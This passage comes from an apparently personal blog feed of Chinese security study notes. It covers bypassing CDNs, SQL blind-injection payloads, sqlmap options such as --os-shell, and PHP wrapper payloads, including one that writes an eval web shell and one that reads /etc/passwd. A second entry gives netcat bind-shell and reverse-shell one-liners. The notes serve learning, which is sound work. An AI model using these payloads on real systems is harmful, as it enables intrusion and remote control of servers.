href="https://ping.chinaz.com/" title="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><h2 id="绕过CDN查找真实ip"><a href="#绕过CDN查找真实ip" class="headerlink" title="绕过CDN查找真实ip"></a>绕过CDN查找真实ip</h2><ul><li>有些站点的主站使用了CDN，某些子域名可能未使用。一般子域名极有可能和主站保持同一IP，所以扫描子域名可以查找到真实IP。</li><li>目标站点存在漏洞，如phpinfo敏感信息泄露，github信息泄露等。若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</li><li>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip。<a href="http://www.17ce.com/" title="http://www.17ce.com/">http://www.17ce.com/</a></li><li>很多站点都有发送邮件sendmail的功能，如Rss邮件订阅等。而且一般的邮件系统很多都是在内部，没有经过CDN的解析，在邮件源码里面就会包含服务器的真实 IP。</li><li>FOFA付费服务：云资产原始IP查询</li></ul><h1 id="红队信息收集"><a href="#红队信息收集" class="headerlink" title="红队信息收集"></a>红队信息收集</h1><p><a href="https://www.cnblogs.com/AffectedFish/p/16926959.html">https://www.cnblogs.com/AffectedFish/p/16926959.html</a><br><a href="https://xz.aliyun.com/t/10236?u_atoken=b43106d9a9c747e0863023033400e7bb&u_asig=1a0c399d17323596204497915e003a">https://xz.aliyun.com/t/10236?u_atoken=b43106d9a9c747e0863023033400e7bb&amp;u_asig=1a0c399d17323596204497915e003a</a></p><h1 id="身份验证技术"><a href="#身份验证技术" class="headerlink" title="身份验证技术"></a>身份验证技术</h1><h2 id="Cookie-Session"><a href="#Cookie-Session" class="headerlink" title="Cookie&amp;Session"></a>Cookie&amp;Session</h2><p>Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制。</p><p>1.存储位置不同：<br>Cookie是存储在客户端（浏览器）上的，而Session是存储在服务器端的。</p><p>2.安全性不同：<br>Cookie存储在客户端上，可能会被黑客利用窃取信息，而Session存储在服务器上，更加安全。</p><p>3.存储容量不同：<br>Cookie的存储容量有限，一般为4KB，而Session的存储容量理论上没有限制，取决于服务器的硬件和配置。</p><p>4.生命周期不同：<br>Cookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而Session一般默认在浏览器关闭后就会过期。</p><p>5.访问方式不同：<br>Cookie可以通过JavaScript访问，而Session只能在服务器端进行访问。</p><p>6.使用场景不同：<br>Cookie一般用于存储小型的数据，如用户名和密码等信息。而Session一般用于存储大型的数据，如购物车、登录状态等信息。</p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在<strong>每次</strong>请求时发送给服务器进行身份验证。如果这时对用户名及密码进行抓包爆破，即使密码正确也无法成功登录，因为token对应不上。</p><p>保证了数据包的唯一性，防止暴力破解。</p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>DOM 将 HTML 文档解析为一个由节点组成的树，称为 DOM 树。每个节点表示文档中的一个部分（例如元素、文本、属性等）。开发者可以通过JavaScript访问、修改和动态更新文档的内容、结构和样式。</p><p>例如：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>World<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结构：</p><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span><br>├── <span class="hljs-selector-tag">p</span><br>│   └── <span class="hljs-selector-tag">Text</span>: <span class="hljs-string">&quot;Hello&quot;</span><br>└── p<br>    └── Text: <span class="hljs-string">&quot;World&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="DOM-的常用操作"><a href="#DOM-的常用操作" class="headerlink" title="DOM 的常用操作"></a>DOM 的常用操作</h2><h3 id="获取对象"><a href="#获取对象" class="headerlink" title="获取对象"></a>获取对象</h3><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 这是标题 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 选择第一个 h1 元素 --&gt;</span><br>document.querySelector(&#x27;h1&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择所有具有 &#x27;id&#x27; 类的元素 --&gt;</span><br>document.querySelector(&#x27;.id&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择具有 &#x27;myHeader&#x27; id 的元素 --&gt;</span><br>document.querySelector(&#x27;#myHeader&#x27;)<br></code></pre></td></tr></table></figure><h3 id="获取对象属性"><a href="#获取对象属性" class="headerlink" title="获取对象属性"></a>获取对象属性</h3><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- HTML代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- JavaScript代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 选择第一个 h1 元素</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> h1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;h1&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">  **<span class="hljs-comment">// 获取 h1 元素的 id 属性</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> id = h1.<span class="hljs-property">id</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 输出 id 到控制台</span></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(id);**</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="利用DOM实现图片更新操作"><a href="#利用DOM实现图片更新操作" class="headerlink" title="利用DOM实现图片更新操作"></a>利用DOM实现图片更新操作</h2><p><img src="/../images/Pasted%20image%2020241124221938.png"></p><p>更换图片只需修改img.src：</p><p><img src="/../images/Pasted%20image%2020241124222246.png"></p><p>如果这里2.png是一个用户传递的变量，就会造成<strong>DOM型XSS</strong>。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>原理：接受的参数值未进行过滤直接带入SQL查询。</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>在注入过程中，获取的数据不能回显至前端页面，常规的联合查询注入不行，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><p>1、基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid</p><p>注入逻辑：</p><ul><li>当条件为真时，页面正常返回；为假时，页面异常或没有数据返回。</li><li>攻击者可以通过逐字符猜测数据。</li></ul><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">7</span>;<br><span class="hljs-keyword">and</span> left(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>;<br><span class="hljs-keyword">and</span> left(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>)=<span class="hljs-string">&#x27;pi&#x27;</span>;<br><span class="hljs-keyword">and</span> substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>;<br><span class="hljs-keyword">and</span> substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;i&#x27;</span>;<br><span class="hljs-keyword">and</span> ord(left(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>))=<span class="hljs-number">112</span>;<br></code></pre></td></tr></table></figure><p>2、基于时间的SQL盲注-延时判断<br>if,sleep</p><p>注入逻辑：</p><ul><li>如果条件成立，则执行 SLEEP() 或类似延迟函数，页面响应时间增加；否则立即返回。</li><li>攻击者逐字符猜测数据库名、表名等信息。</li></ul><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> sleep(<span class="hljs-number">1</span>);<br><span class="hljs-attribute">and</span> if(<span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">0</span>);<br><span class="hljs-attribute">and</span> if(<span class="hljs-number">1</span>&lt;<span class="hljs-number">2</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">0</span>);<br><span class="hljs-attribute">and</span> if(length(database())=<span class="hljs-number">7</span>,sleep(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>);<br><span class="hljs-attribute">and</span> if(and left(database(),<span class="hljs-number">2</span>)=&#x27;pi&#x27;,sleep(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>3、基于报错的SQL盲注-报错回显</p><p>数据库通常会在语法错误或非法操作时抛出详细的错误消息。通过构造特定的恶意 SQL 语句，使数据库抛出错误，从错误中提取信息。</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> datebase()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x5c</span>, (<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>)));<br></code></pre></td></tr></table></figure><h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园</a></p><p>测试站点：<a href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a></p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">--current-db</span>   <span class="hljs-comment">#获取当前数据库名</span><br><br><span class="hljs-built_in">--tables</span> -<span class="hljs-string">D</span> <span class="hljs-string">&quot;数据库名&quot;</span>     <span class="hljs-comment">#获取表名</span><br><br><span class="hljs-built_in">--columns</span> -<span class="hljs-string">T</span> <span class="hljs-string">&quot;表名&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">&quot;数据库名&quot;</span>    <span class="hljs-comment">#获取列名</span><br><br><span class="hljs-built_in">--dump</span> -<span class="hljs-string">C</span> <span class="hljs-string">&quot;列名&quot;</span> -<span class="hljs-string">T</span> <span class="hljs-string">&quot;表名&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">&quot;数据库名&quot;</span>    <span class="hljs-comment">#获取数据</span><br><br></code></pre></td></tr></table></figure><p>MYSQL区分root和非root:</p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment">#引出权限：</span><br><span class="hljs-built_in">--privileges</span>     <span class="hljs-comment"># 查看权限</span><br><span class="hljs-built_in">--is-dba</span>    <span class="hljs-comment"># 是否是数据库管理员</span><br><br><span class="hljs-built_in">--sql-shell</span> <span class="hljs-comment"># 执行指定sql命令</span><br><br><span class="hljs-comment">#引出文件：</span><br><span class="hljs-built_in">--file-read</span>     <span class="hljs-comment"># 读取指定文件</span><br><span class="hljs-built_in">--file-write</span>      <span class="hljs-comment"># 写入本地文件</span><br><span class="hljs-built_in">--file-dest</span> <br><br><span class="hljs-comment">#引出命令：</span><br><span class="hljs-built_in">--os-cmd=calc</span>  <span class="hljs-comment"># 调出计算器</span><br><span class="hljs-built_in">--os-shell</span> <br><span class="hljs-built_in">--sql-shell</span><br><br><span class="hljs-comment">#提交方法：</span><br><span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-comment"># 表单里POST请求，抓包找数据请求，不推荐</span><br><br><span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-comment"># Cookie，不推荐</span><br><br>-<span class="hljs-string">r</span> <span class="hljs-string">1</span>.<span class="hljs-string">txt</span>    <span class="hljs-comment"># 推荐，数据完整性。把请求标头放进文件，但其实文件里不知道注入点，后面加上星号（*）标明注入点</span><br><br></code></pre></td></tr></table></figure><h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p><img src="/../images/Pasted%20image%2020241129165616.png"></p><ul><li>文件读取：</li></ul><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd  <span class="hljs-comment"># 绝对路径</span><br><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=phpinfo.php  <span class="hljs-comment"># 相对路径</span><br></code></pre></td></tr></table></figure><ul><li>文件写入：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=phpinfo.php  </span><br>POST data: content=base64的数据<br><span class="hljs-comment"># 需要在代码中有类似file_put_contents($_GET[&#x27;file&#x27;],$_POST[&#x27;content&#x27;])写法</span><br><br>php:<span class="hljs-comment">//input </span><br>POST data:<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>代码执行：</li></ul><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php://input POST:</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JS&quot;&gt;&lt;a href=&quot;#JS&quot; class=&quot;headerlink&quot; title=&quot;JS&quot;&gt;&lt;/a&gt;JS&lt;/h1&gt;&lt;p&gt;流行的JS框架有Vue、NodeJS、jQuery、Angular等。&lt;/p&gt;
&lt;p&gt;JS安全问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;源码泄漏&lt;/</summary>
      
    
    
    
    
    <category term="网络安全学习笔记" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>反弹SHELL</title>
    <link href="http://example.com/2024/11/20/%E5%8F%8D%E5%BC%B9SHELL/"/>
    <id>http://example.com/2024/11/20/%E5%8F%8D%E5%BC%B9SHELL/</id>
    <published>2024-11-20T07:12:05.000Z</published>
    <updated>2024-12-09T08:32:41.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正反向代理"><a href="#正反向代理" class="headerlink" title="正反向代理"></a>正反向代理</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a><strong>定义</strong></h3><p>正向代理是一种代理服务器，位于客户端和目标服务器之间，代理客户端向目标服务器发送请求。客户端通过正向代理访问无法直接访问的资源。</p><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a><strong>工作流程</strong></h3><ul><li>客户端 -&gt; 正向代理服务器 -&gt; 目标服务器。</li><li>客户端明确知道自己正在通过代理访问。</li></ul><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a><strong>用途</strong></h3><ul><li><strong>突破网络限制</strong>：访问被防火墙或地理位置限制的资源（例如翻墙）。</li><li><strong>匿名访问</strong>：隐藏客户端的真实 IP 地址。</li><li><strong>缓存加速</strong>：通过缓存常用资源减少重复请求。</li></ul><h3 id="典型应用场景"><a href="#典型应用场景" class="headerlink" title="典型应用场景"></a><strong>典型应用场景</strong></h3><ul><li>企业内部通过正向代理访问互联网。</li><li>使用 VPN 或 Shadowsocks 等工具突破地理限制。</li></ul><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>反向代理是一种代理服务器，位于目标服务器和客户端之间，代理目标服务器向客户端返回资源。客户端的请求通过反向代理访问服务器。</p><h3 id="工作流程-1"><a href="#工作流程-1" class="headerlink" title="工作流程"></a>工作流程</h3><ul><li>客户端 -&gt; 反向代理服务器 -&gt; 后端服务器。</li><li>客户端通常不知道自己访问的是反向代理。</li></ul><h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><ul><li><strong>负载均衡</strong>：分发请求到多台后端服务器，减轻单一服务器的压力。</li><li><strong>隐藏服务器信息</strong>：保护后端服务器的 IP 和架构信息。</li><li><strong>缓存与加速</strong>：为静态资源提供缓存，减少后端压力。</li><li><strong>SSL 卸载</strong>：反向代理负责处理 HTTPS 请求，减轻后端服务器的计算负担。</li></ul><h3 id="典型应用场景-1"><a href="#典型应用场景-1" class="headerlink" title="典型应用场景"></a>典型应用场景</h3><ul><li>使用 Nginx 或 Apache 作为反向代理，处理多个后端服务器的请求。</li><li>CDN（内容分发网络）服务，代理请求到最近的缓存服务器或源站。</li><li>Web 应用防火墙（WAF）通过反向代理部署。</li></ul><h1 id="正反向连接"><a href="#正反向连接" class="headerlink" title="正反向连接"></a>正反向连接</h1><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><p>客户端主动发起连接到服务器或目标系统。正向连接通常用于客户端-服务器通信，客户端主动请求服务或资源，例如网页浏览、电子邮件发送和接收等。在正向连接中，客户端充当主动方，向服务器发起连接请求，然后服务器接受并处理请求。</p><h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h3><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>正向 Shell 是目标主机主动开放一个端口，监听外部的连接请求（通常由攻击者发起）。攻击者通过连接该端口获得目标系统的命令行访问权限。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li>目标主机开启一个监听服务，等待连接请求。</li><li>攻击者主动连接到目标主机的开放端口。</li><li>连接建立后，攻击者可以通过该 Shell 发送命令并与目标主机交互。</li></ol><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>主动监听：目标主机需要开放一个端口，等待外部连接。</li><li>常见于漏洞利用后：例如在获得目标系统访问权限后，用来建立长期连接。</li><li>依赖网络开放性：如果目标主机被防火墙或 NAT 保护，正向 Shell 的端口可能无法被外部访问。</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>在目标主机上执行：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span> -e /bin/bash<br></code></pre></td></tr></table></figure><ul><li><code>-l</code>: 表示监听模式。</li><li><code>-v</code>: 开启详细输出。</li><li><code>-p</code>: 指定监听的端口（如 8888）。</li><li><code>-e</code>: 指定要执行的程序（这里是 <code>/bin/bash</code>）。</li></ul><p>攻击者在自己的机器上执行：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> 目标IP <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h2><p>目标系统（通常是受害者）主动建立与控制系统或服务器的连接。反向连接通常用于合法的远程管理和控制，例如远程桌面会话、SSH远程管理等。在反向连接中，目标系统充当客户端，主动连接到远程服务器或控制服务器，以接受命令并将结果返回。</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h3 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h3><p>反弹 Shell 是目标主机主动向攻击者的主机发起连接，将其 Shell 权限回传给攻击者。通常用于目标主机位于防火墙或 NAT 后，无法直接被外部访问时。</p><h3 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li>攻击者在自己的机器上开启一个监听端口。</li><li>目标主机通过一个有效载荷（Payload）主动连接到攻击者的监听端口。</li><li>连接建立后，目标主机的命令行权限被转交给攻击者。</li></ol><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ul><li>绕过防火墙和 NAT：目标主机通过反向连接绕过自身的网络限制。</li><li>攻击者被动监听：攻击者只需要等待目标主机发起连接。</li><li>更常见于实际渗透：尤其是目标系统网络环境受限时。</li></ul><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>攻击者在本地机器上执行：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>目标主机上执行： </p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> 攻击者IP <span class="hljs-number">8888</span> -e /bin/bash<br></code></pre></td></tr></table></figure><p>反弹Shell命令一键生成：<a href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum*</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;正反向代理&quot;&gt;&lt;a href=&quot;#正反向代理&quot; class=&quot;headerlink&quot; title=&quot;正反向代理&quot;&gt;&lt;/a&gt;正反向代理&lt;/h1&gt;&lt;h2 id=&quot;正向代理&quot;&gt;&lt;a href=&quot;#正向代理&quot; class=&quot;headerlink&quot; title=&quot;正向代理&quot;</summary>
      
    
    
    
    
    <category term="网络安全学习笔记" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
